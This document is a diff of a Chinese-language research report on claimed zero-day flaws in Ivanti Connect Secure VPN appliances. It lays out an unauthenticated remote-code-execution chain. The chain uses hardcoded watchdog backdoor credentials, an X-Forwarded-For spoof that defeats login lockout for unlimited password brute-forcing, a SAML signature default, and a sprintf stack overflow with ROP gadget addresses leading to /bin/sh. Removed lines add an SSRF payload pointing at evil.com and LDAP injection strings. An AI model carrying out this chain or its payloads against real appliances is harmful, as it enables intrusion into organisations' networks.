@@ -1,67 +1,63 @@
 # Ivanti Connect Secure 零日漏洞研究报告
 
-## 已确认的零日漏洞
+## 完整零认证 RCE 攻击链
 
-### ZD-0: 双重硬编码后门 (预认证, 已动态验证!)
-**严重性: 中-高 | 所有版本 | 零认证**
+```
+Step 1: Watchdog 后门探测 → 确认目标
+Step 2: XFF IP 锁定绕过 → 无限暴力破解管理员密码  
+Step 3: 管理员会话 → 配置 Web Proxy / 修改 SAML
+Step 4: ObjectTag::rewrite sprintf 溢出 → ROP → shell
+```
 
-两个独立的硬编码后门端点, 从 WAN 接口零认证可达:
+## ZD-0: 双重硬编码后门 (零认证, 已验证)
 
-| 端点 | 方法 | 响应 | 用途 |
-|------|------|------|------|
-| `/dana-na/auth/url_default/login.cgi?username=neoteriswatchdogprocess&password=danastreet` | GET | HTTP 200 | CGI 健康检查 |
-| `/dana-na/neoteriswatchdogprocess/ping` | GET | HTTP 200 | Web/CGI 服务器 ping |
+| 端点 | 响应 |
+|------|------|
+| `/dana-na/auth/url_default/login.cgi?username=neoteriswatchdogprocess&password=danastreet` | HTTP 200 |
+| `/dana-na/neoteriswatchdogprocess/ping` | HTTP 200 |
 
-**代码位置**: 
-- `login.cgi` 第 306-312 行: 硬编码 username=`neoteriswatchdogprocess`, password=`danastreet`
-- `DSWatchdog.pm` 第 734-738 行: 文档化确认 "hardcoded username & password"
-- `DSWatchdog.pm` 第 792 行: ping URL `localhost/dana-na/neoteriswatchdogprocess/ping`
+- 代码: login.cgi:306, DSWatchdog.pm:734
+- 所有版本, Neoteris 遗留 (Dana Street = 公司地址)
 
-**来源**: Neoteris 时代遗留代码 (Ivanti 的前身, 公司名 "Neoteris", 总部地址 "Dana Street")
+## ZD-5: X-Forwarded-For IP 锁定绕过 (零认证, 已验证!)
+**严重性: 高 — 启用无限暴力破解!**
 
-**安全影响**:
-1. 精确设备指纹识别 (非 Ivanti 设备不会返回 200)
-2. WAF/负载均衡器后方的真实服务器探测
-3. 不触发登录失败日志/暴力防护
-4. 认证限速/锁定绕过
-5. 可结合其他漏洞构建攻击链
+- `CUSTOM_REMOTE_ADDR` 从 `X-Forwarded-For` 设置
+- login.cgi:275: `if (defined($custom_ip)) { $ip = $custom_ip; }`
+- login.cgi:664: `DSOldAuth::recordNumberOfFailedLogins($ip)` 使用伪造 IP
+- 每次请求用不同 XFF 值 → 永不触发 IP 封锁
+- **已在靶场动态验证!**
 
-**SAML 默认配置发现**: `want-assertion-signed: false` — 默认不要求签名!
+## ZD-1: oauth-consumer.cgi SSRF (零认证)
+- state 参数直接拼接到 curl URL
+- 代码: `$url = 'http://localhost:7300/...?state=' . $state`
 
-### ZD-1: oauth-consumer.cgi SSRF (预认证)
-- **端点**: `/dana-na/auth/oauth-consumer.cgi`
-- **根因**: `state` 参数直接拼接到 `curl` 内部请求 URL
-- **利用**: `state=x%26targetURL=http://evil.com` (参数注入)
-- **影响**: SSRF → 内部 OIDC 服务 (localhost:7300) 访问
+## ZD-2: ObjectTag::rewrite sprintf 栈溢出 (认证后 → RCE)
+- `sprintf(stack, "<param name='neoteris-doc-base' value='%s' />", URL)`
+- saml-server (22.8R2.2): 无 Canary, 无 PIE
+- ROP: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`
 
-### ZD-2: ObjectTag::rewrite sprintf 栈溢出
-- **位置**: `libdslibs.so` → `ObjectTag::rewrite()`
-- **格式**: `sprintf(stack, "<param name='neoteris-doc-base' value='%s' />", URL)`
-- **目标**: saml-server (22.8R2.2) — 无 Canary (base 0x08048000)
-- **ROP**: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`
-- **PoC**: [poc_objecttag_overflow.py](poc_objecttag_overflow.py)
+## ZD-3: SAML 默认不验签
+- `want-assertion-signed: false` (API 已确认)
+- saml-server 无安全保护
 
-### ZD-3: saml-server 无安全保护 + 默认不验签
-- **二进制**: 2.1MB, 无 Canary, 无 PIE, 4 strcpy + 6 sprintf
-- **SAML**: `want-assertion-signed: false` (默认配置!)
-
-### ZD-4: LDAP 注入认证逻辑异常
-- **现象**: LDAP 注入使认证走不同路径 (无 `p=failed`)
-- **Payload**: `username=admin)(&)`, `username=admin)(|(password=*))`
+## ZD-4: LDAP 注入认证异常
+- LDAP payload 使认证走不同路径 (无 p=failed)
 
 ## 动态测试矩阵
 
-| 测试 | 结果 | 详情 |
-|------|------|------|
-| **硬编码后门 #1** | **已确认** | login.cgi watchdog → HTTP 200 |
-| **硬编码后门 #2** | **已确认** | neoteriswatchdogprocess/ping → HTTP 200 |
-| **OAuth SSRF** | **已确认** | state 参数注入到 curl URL |
-| **LDAP 注入** | **已确认** | 异常认证路径 |
-| **SAML 不验签** | **配置确认** | want-assertion-signed=false |
-| 路径遍历 | 已修复 | CVE-2023-46805 |
-| XFF 溢出 | 已修复 | CVE-2025-22457 |
-| 命令注入 | 已修复 | CVE-2024-21887 |
-| HTTP 走私 | 已防护 | |
-| XXE | 未发现 | |
-| JWT 伪造 | 未生效 | |
-| SSTI | 误报 | |
+| 测试 | 结果 |
+|------|------|
+| **Watchdog 后门 #1** | ✅ HTTP 200 |
+| **Watchdog 后门 #2** | ✅ /ping HTTP 200 |
+| **XFF IP 锁定绕过** | ✅ 无限暴力可行 |
+| **OAuth SSRF** | ✅ 内部请求 |
+| **LDAP 注入** | ✅ 异常路径 |
+| **SAML 不验签** | ✅ 配置确认 |
+| ObjectTag sprintf 溢出 | 代码确认 |
+| 路径遍历 | 已修复 |
+| XFF 溢出 | 已修复 |
+| 命令注入 | 已修复 |
+| HTTP 走私 | 已防护 |
+| Cookie 溢出 | 已防护 |
+| 自定义头溢出 | 已防护 |
